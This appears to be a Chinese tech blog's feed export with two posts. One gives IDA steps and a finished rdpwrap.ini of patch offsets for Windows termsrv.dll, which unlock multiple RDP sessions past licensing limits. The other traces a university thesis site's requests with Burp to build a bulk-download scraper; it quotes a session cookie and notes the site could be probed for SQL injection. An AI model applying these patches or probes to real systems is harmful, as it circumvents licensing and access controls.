        <content type="html"><![CDATA[<p>制作ini文件步骤<br>windows/system32下，备份termsrv.dll 用ida打开逆向</p><p>等加载完</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329203537279.png" alt="image-20240329203537279"></p><p>alt+M  mark一下_DllMainCRTStartup</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329202513929.png" alt="image-20240329202513929"></p><h3 id="LocalOnlyOffset-x64"><a href="#LocalOnlyOffset-x64" class="headerlink" title="LocalOnlyOffset.x64"></a>LocalOnlyOffset.x64</h3><p>alt+T或者软件左上角搜索IsLicenseTypeLocalOnly</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329201511191.png" alt="image-20240329201511191"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329201436326.png" alt="image-20240329201436326"></p><p>alt+b  搜74</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329201711898.png" alt="image-20240329201711898"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329201853540.png" alt="image-20240329201853540"></p><p>取9D661</p><p>LocalOnlyOffset.x64=9D661</p><hr><h3 id="SingleUserOffset-x64"><a href="#SingleUserOffset-x64" class="headerlink" title="SingleUserOffset.x64"></a>SingleUserOffset.x64</h3><p>回到mark点</p><p>alt+t搜CSessionArbitrationHelper::IsSingleSessionPerUserEnabled</p><p>找到下下个匹配目标如图所示，回车进入</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329230636107.png" alt="image-20240329230636107"></p><p>alt+t 搜<code>, 1</code> 中间有空格，目的是光标跳转到那个模块中</p><p>alt+b 搜01</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329231349994.png" alt="image-20240329231349994"></p><p>取18862得</p><p>SingleUserOffset.x64=18862</p><hr><h3 id="DefPolicyOffset-x64"><a href="#DefPolicyOffset-x64" class="headerlink" title="DefPolicyOffset.x64"></a>DefPolicyOffset.x64</h3><p>回mark位置</p><p>alt+t搜Query@CDefPolicy</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329232104719.png" alt="image-20240329232104719"></p><p>跳出来这个，莫慌，双击点进去看到</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329232137066.png" alt="image-20240329232137066"></p><p>二进制搜<code>39 81</code> 取1C2E5</p><p>DefPolicyOffset.x64=1C2E5</p><hr><h3 id="SLInitOffset-x64"><a href="#SLInitOffset-x64" class="headerlink" title="SLInitOffset.x64"></a>SLInitOffset.x64</h3><p>回到mark点</p><p>text搜 CSLQuery::Initialize</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329232653213.png" alt="image-20240329232653213"></p><p>切换视图hex，在对应位置的前一个CC，可通过71那行作为参考</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329233434985.png" alt="image-20240329233434985"></p><p>二进制搜索40，</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329233652192.png" alt="image-20240329233652192"></p><p>取29ED0得</p><p>SLInitOffset.x64=29ED0</p><hr><h3 id="SLInit"><a href="#SLInit" class="headerlink" title="SLInit"></a>SLInit</h3><p>回mark点</p><p>text搜bInitialized，双击进去</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329234103037.png" alt="image-20240329234103037"></p><p>然后找对应项，取6位地址即可（注意，之前都是取5位）</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329235017128.png" alt="image-20240329235017128"></p><p>至此，针对10.0.22621.3374这个版本的rdpwrap.ini已制作好</p><h3 id="附"><a href="#附" class="headerlink" title="附"></a>附</h3><p>这个版本ini全部内容</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Main]</span></span><br><span class="line"><span class="attr">Updated</span>=<span class="number">2024</span>-<span class="number">03</span>-<span class="number">29</span></span><br><span class="line"><span class="attr">LogFile</span>=\rdpwrap.txt</span><br><span class="line"><span class="attr">SLPolicyHookNT60</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">SLPolicyHookNT61</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="section">[SLPolicy]</span></span><br><span class="line"><span class="attr">TerminalServices-RemoteConnectionManager-AllowRemoteConnections</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">TerminalServices-RemoteConnectionManager-AllowMultipleSessions</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">TerminalServices-RemoteConnectionManager-AllowAppServerMode</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">TerminalServices-RemoteConnectionManager-AllowMultimon</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">TerminalServices-RemoteConnectionManager-MaxUserSessions</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">TerminalServices-RemoteConnectionManager-ce0ad219-4670-4988-98fb-89b14c2f072b-MaxSessions</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">TerminalServices-RemoteConnectionManager-45344fe7-00e6-4ac6-9f01-d01fd4ffadfb-MaxSessions</span>=<span class="number">2</span></span><br><span class="line"><span class="attr">TerminalServices-RDP-7-Advanced-Compression-Allowed</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">TerminalServices-RemoteConnectionManager-45344fe7-00e6-4ac6-9f01-d01fd4ffadfb-LocalOnly</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">TerminalServices-RemoteConnectionManager-8dc86f1d-9969-4379-91c1-06fe1dc60575-MaxSessions</span>=<span class="number">1000</span></span><br><span class="line"><span class="attr">TerminalServices-DeviceRedirection-Licenses-TSEasyPrintAllowed</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">TerminalServices-DeviceRedirection-Licenses-PnpRedirectionAllowed</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">TerminalServices-DeviceRedirection-Licenses-TSMFPluginAllowed</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">TerminalServices-RemoteConnectionManager-UiEffects-DWMRemotingAllowed</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="section">[PatchCodes]</span></span><br><span class="line"><span class="attr">nop</span>=<span class="number">90</span></span><br><span class="line"><span class="attr">Zero</span>=<span class="number">00</span></span><br><span class="line"><span class="attr">jmpshort</span>=EB</span><br><span class="line"><span class="attr">nopjmp</span>=<span class="number">90</span>E9</span><br><span class="line"><span class="attr">CDefPolicy_Query_edx_ecx</span>=BA000100008991200300005E90</span><br><span class="line"><span class="attr">CDefPolicy_Query_eax_rcx_jmp</span>=B80001000089813806000090EB</span><br><span class="line"><span class="attr">CDefPolicy_Query_eax_esi</span>=B80001000089862003000090</span><br><span class="line"><span class="attr">CDefPolicy_Query_eax_rdi</span>=B80001000089873806000090</span><br><span class="line"><span class="attr">CDefPolicy_Query_eax_ecx</span>=B80001000089812003000090</span><br><span class="line"><span class="attr">CDefPolicy_Query_eax_ecx_jmp</span>=B800010000898120030000EB0E</span><br><span class="line"><span class="attr">CDefPolicy_Query_eax_rcx</span>=B80001000089813806000090</span><br><span class="line"><span class="attr">CDefPolicy_Query_edi_rcx</span>=BF0001000089B938060000909090</span><br><span class="line"></span><br><span class="line"><span class="section">[10.0.22621.3374]</span></span><br><span class="line"><span class="attr">LocalOnlyPatch.x64</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">LocalOnlyOffset.x64</span>=<span class="number">9</span>D661</span><br><span class="line"><span class="attr">LocalOnlyCode.x64</span>=jmpshort</span><br><span class="line"><span class="attr">SingleUserPatch.x64</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">SingleUserOffset.x64</span>=<span class="number">18862</span></span><br><span class="line"><span class="attr">SingleUserCode.x64</span>=Zero</span><br><span class="line"><span class="attr">DefPolicyPatch.x64</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">DefPolicyOffset.x64</span>=<span class="number">1</span>C2E5</span><br><span class="line"><span class="attr">DefPolicyCode.x64</span>=CDefPolicy_Query_eax_rcx_jmp</span><br><span class="line"><span class="attr">SLInitHook.x64</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">SLInitOffset.x64</span>=<span class="number">29</span>ED0</span><br><span class="line"><span class="attr">SLInitFunc.x64</span>=New_CSLQuery_Initialize</span><br><span class="line"></span><br><span class="line"><span class="section">[SLInit]</span></span><br><span class="line"><span class="attr">bServerSku</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">bRemoteConnAllowed</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">bFUSEnabled</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">bAppServerAllowed</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">bMultimonAllowed</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">lMaxUserSessions</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">ulMaxDebugSessions</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">bInitialized</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="section">[10.0.22621.3374-SLInit]</span></span><br><span class="line"><span class="attr">bInitialized.x64</span>         =<span class="number">12</span>BF4C</span><br><span class="line"><span class="attr">bServerSku.x64</span>        =<span class="number">12</span>BF50</span><br><span class="line"><span class="attr">lMaxUserSessions.x64</span>  =<span class="number">12</span>BF54</span><br><span class="line"><span class="attr">bAppServerAllowed.x64</span> =<span class="number">12</span>BF5C</span><br><span class="line"><span class="attr">bRemoteConnAllowed.x64</span>=<span class="number">12</span>BF64</span><br><span class="line"><span class="attr">bMultimonAllowed.x64</span>  =<span class="number">12</span>BF68</span><br><span class="line"><span class="attr">ulMaxDebugSessions.x64</span>=<span class="number">12</span>BF70</span><br><span class="line"><span class="attr">bFUSEnabled.x64</span>       =<span class="number">12</span>BF74</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240329235604888.png" alt="image-20240329235604888"></p><p>测试通过</p><p>当然，也可以把这个ini合并到兼容历史版本的ini中（没有必要）</p><p>感谢 <a href="https://www.youtube.com/watch?v=7ZjgehDztBQ">https://www.youtube.com/watch?v=7ZjgehDztBQ</a></p><p><a href="https://www.youtube.com/watch?v=ThWf9B-D_5U">https://www.youtube.com/watch?v=ThWf9B-D_5U</a></p>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> rdpwrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬论文</title>
      <link href="2024/03/28/%E6%8A%98%E8%85%BE%E5%90%A7/%E7%88%AC%E8%AE%BA%E6%96%87/"/>
      <url>2024/03/28/%E6%8A%98%E8%85%BE%E5%90%A7/%E7%88%AC%E8%AE%BA%E6%96%87/</url>
      
        <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>下论文看，但是发现这个页面有个异步加载的模块，具体来说会随着左边的筛选来实时更新右侧论文结果，虽然chrome检查源码可以获得，但是xpath获取不到，而且真实的查询url也没有在js或者html中看到</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240328114235643.png" alt="image-20240328114235643"></p><p>xpath插件匹配不到元素，为了摸清楚论文从数据库加载到眼前的整个流程，使用chrome+burp+postman验证</p><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>挂学校vpn</p><p>chrome挂burp代理 拿Site map，结合要测的模块，分别找到对应请求接口</p><ul><li>根据筛选获取论文列表</li><li>查看论文详情，获取论文下载和查看链接</li><li>论文列表下一页</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240328114910755.png" alt="image-20240328114910755"></p><p>题外话，这里可以测一波sql注入</p><p>返回一个论文列表，onclick触发，但是并不是直接的论文链接，而是两个论文参数拼接，chrome中鼠标点一下看看burp能抓到啥</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240328115247143.png" alt="image-20240328115247143"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240328115139061.png" alt="image-20240328115139061"></p><p>鼠标点击后两个论文参数作为post的body参数传递，进入论文信息页面，找到html的查看全文接口</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240328115624079.png" alt="image-20240328115624079"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240328115807878.png" alt="image-20240328115807878"></p><p>点一下看看，发现论文下载和查看链接只是地址拼接以上信息即可，至此获取论文的下载链接</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240328115931849.png" alt="image-20240328115931849"></p><p>回到论文列表，再看下下一页接口，简单的get请求，使用postman模拟下，200 ok，注意这里postman header也要和获取论文列表时一样，需要添加burp中请求一样的cookie值。请求论文信息时只需要content-type一致即可</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240328114508501.png" alt="image-20240328114508501"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240328120114661.png" alt="image-20240328120114661"></p><h3 id="实施计划"><a href="#实施计划" class="headerlink" title="实施计划"></a>实施计划</h3><p>既然知道了完整原理，代码该如何写呢？</p><ul><li>python写一个post请求，从burp中复制chrome中查询参数作为body参数，body内容为：ffields=degree%3A%E5%8D%9A%E5%A3%AB%E5%90%8E%2C%E5%8D%9A%E5%A3%AB%3Aspecial%3Afuzzy%7Cdegree_type%3A%E5%8D%9A%E5%A3%AB%E5%90%8E%2C%E5%B7%A5%E5%AD%A6%E5%8D%9A%E5%A3%AB%2C%E7%90%86%E5%AD%A6%E5%8D%9A%E5%A3%AB%2C%E5%B7%A5%E7%A8%8B%E7%AE%A1%E7%90%86%E7%A1%95%E5%A3%AB%2C%E5%B7%A5%E7%A8%8B%E7%A1%95%E5%A3%AB%2C%E5%B7%A5%E5%AD%A6%E7%A1%95%E5%A3%AB%2C%E7%90%86%E5%AD%A6%E7%A1%95%E5%A3%AB%3Aspecial%3Afuzzy%7Ccomplete_date_year%3A2023%3Aand%7Cdepartment%3A%E4%BF%A1%E6%81%AF%E5%AD%A6%E9%83%A8%2C%E7%90%86%E5%B7%A5%E5%AD%A6%E9%99%A2%2C%E8%BD%AF%E4%BB%B6%E5%AD%A6%E9%99%A2%2C%E4%BF%A1%E6%81%AF%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%AD%A6%E9%99%A2%2C%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%8E%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2%2C%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6%E4%B8%8E%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2%3Aspecial%3Aexact%7Cxkcode%3A07*+OR+08*+OR+14*%3Aand&amp;ffieldstr=%E5%8D%9A%E5%A3%AB%E5%90%8E%26%E5%8D%9A%E5%A3%AB%26%E5%8D%9A%E5%A3%AB%E5%90%8E%26%E5%B7%A5%E5%AD%A6%E5%8D%9A%E5%A3%AB%26%E7%90%86%E5%AD%A6%E5%8D%9A%E5%A3%AB%26%E5%B7%A5%E7%A8%8B%E7%AE%A1%E7%90%86%E7%A1%95%E5%A3%AB%26%E5%B7%A5%E7%A8%8B%E7%A1%95%E5%A3%AB%26%E5%B7%A5%E5%AD%A6%E7%A1%95%E5%A3%AB%26%E7%90%86%E5%AD%A6%E7%A1%95%E5%A3%AB%26%E4%BF%A1%E6%81%AF%E5%AD%A6%E9%83%A8%26%E7%90%86%E5%B7%A5%E5%AD%A6%E9%99%A2%26%E8%BD%AF%E4%BB%B6%E5%AD%A6%E9%99%A2%26%E4%BF%A1%E6%81%AF%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%AD%A6%E9%99%A2%26%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%8E%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2%26%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6%E4%B8%8E%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2%26%E7%90%86%E5%AD%A6%26%E5%B7%A5%E5%AD%A6%26%E4%BA%A4%E5%8F%89%E5%AD%A6%E7%A7%91&amp;searchkeyword=%E5%B7%A5%E5%AD%A6&amp;searchstrs=&amp;degree_check=%E5%8D%9A%E5%A3%AB%E5%90%8E&amp;degree_type_check=%E5%8D%9A%E5%A3%AB%E5%90%8E&amp;degree_check=%E5%8D%9A%E5%A3%AB&amp;degree_type_check=%E5%B7%A5%E5%AD%A6%E5%8D%9A%E5%A3%AB&amp;degree_type_check=%E7%90%86%E5%AD%A6%E5%8D%9A%E5%A3%AB&amp;degree_type_check=%E5%B7%A5%E7%A8%8B%E7%AE%A1%E7%90%86%E7%A1%95%E5%A3%AB&amp;degree_type_check=%E5%B7%A5%E7%A8%8B%E7%A1%95%E5%A3%AB&amp;degree_type_check=%E5%B7%A5%E5%AD%A6%E7%A1%95%E5%A3%AB&amp;degree_type_check=%E7%90%86%E5%AD%A6%E7%A1%95%E5%A3%AB&amp;year_check=2023&amp;department_check=%E4%BF%A1%E6%81%AF%E5%AD%A6%E9%83%A8&amp;department_check=%E7%90%86%E5%B7%A5%E5%AD%A6%E9%99%A2&amp;department_check=%E8%BD%AF%E4%BB%B6%E5%AD%A6%E9%99%A2&amp;department_check=%E4%BF%A1%E6%81%AF%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%AD%A6%E9%99%A2&amp;department_check=%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%8E%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2&amp;department_check=%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6%E4%B8%8E%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2&amp;xkcode_check=07&amp;xkcode_check=08&amp;xkcode_check=14，header参数cookie：JSESSIONID=BCD85613ED45953A6E8B4ECC1AA7BDFA，content-type：application/x-www-form-urlencoded。获取目标论文列表响应resp</li><li>写一个循环，循环变量i从1到n，n为总论文数量，如果i除以20==0，则触发“下一页”get请求，url为2xx.1xx.xx.xxx:8800/pagedown.action?pagenum=20&amp;pager.offset=20，header的cookie：JSESSIONID=BCD85613ED45953A6E8B4ECC1AA7BDFA 获取响应resp，因为每页20篇文章放在一页，所以定义一个index变量=i%20。</li><li>循环中，用xpath语法//td/a@onclick[index] 匹配到第一步得到的resp中td标签下的a标签中的onclick属性中的docinfo中的两个参数，对于匹配到的两个参数分别赋值给id1和id2</li><li>以id1和id2作为body参数，再写一个post请求，header参数cookie：JSESSIONID=BCD85613ED45953A6E8B4ECC1AA7BDFA，body内容为id1=fbb480481b6f68960dc5706d1ff6ecb6&amp;id2=nV46efrR0eQ%25253D，获取论文详情页面resp2</li><li>xpath语法driver.find_element(By.XPATH,”//div[@class=’look btn’]/a@href”)匹配到resp2中的内容，取出href属性值openfile?dbid=72&amp;objid=55_54_49_48_50_50&amp;lwsing=172014b5348fcf30785e542bf4ba4cc5，然后拼接域2xx.xxx.xx.xxx:8800/获得最终完整下载链接url:2xx.xxx.xx.xxx:8800/openfile?dbid=72&amp;objid=55_54_49_48_50_50&amp;lwsing=172014b5348fcf30785e542bf4ba4cc5</li><li>写一个get请求上一步的url链接获取论文并保存到当地文件夹</li></ul><p>至此一个简单爬虫主体框架出来了，甚至都不需要selenium参加，如果使用selenium得使用等待页面元素都加载完成，然后挨个点击论文进行下载，考虑到异步加载xpath抓不到元素然后会多出来语法这块的坑，调试过程，而且似乎没有什么反爬，直接考虑post了</p><p>耽搁了几天时间，再次捡起来这个事情发现获取不到信息，查下来是JSESSIONID的值变了，只要重新burpsuit抓包获取再放到postman中即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pip install Flask Flask-Session</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, make_response, request, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SESSION_TYPE&#x27;</span>] = <span class="string">&#x27;filesystem&#x27;</span> <span class="comment"># 可配置为redis等</span></span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置session</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;views&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;views&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    session[<span class="string">&#x27;views&#x27;</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Session views: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;views&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set/&lt;int:value&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_views</span>(<span class="params">value</span>):</span></span><br><span class="line">    session[<span class="string">&#x27;views&#x27;</span>] = value</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>)) <span class="comment"># 返回302和新的url</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The value of JSESSIONID can change after a certain period of time due to session timeout settings in the servlet container. This is not directly related to connection breaks or cookie expiration times. 通常在java中默认30min</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_cookie&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_cookie</span>():</span></span><br><span class="line">    response = make_response(<span class="string">&#x27;Cookie set!&#x27;</span>)</span><br><span class="line">    expires = datetime.utcnow() + timedelta(hours=<span class="number">1</span>)</span><br><span class="line">    response.set_cookie(name=<span class="string">&#x27;name&#x27;</span>, value=<span class="string">&#x27;value&#x27;</span>, expires=expires)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_cookie&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cookie</span>():</span></span><br><span class="line">    name = request.cookies.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Cookie value: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_paper</span>(<span class="params">save_path, paper_url, file_name</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-]:正在爬取论文链接&#x27;</span> + paper_url) <span class="comment"># + str(i) + &#x27;张... ...&#x27;)</span></span><br><span class="line">    url = paper_url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        pdf_data = requests.get(url=url, headers=headers, timeout=<span class="number">30</span>).content</span><br><span class="line">        save_path = save_path + <span class="built_in">str</span>(file_name) + <span class="string">&#x27;.pdf&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;save_path:&quot;</span>+save_path)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file=save_path, mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> pd:</span><br><span 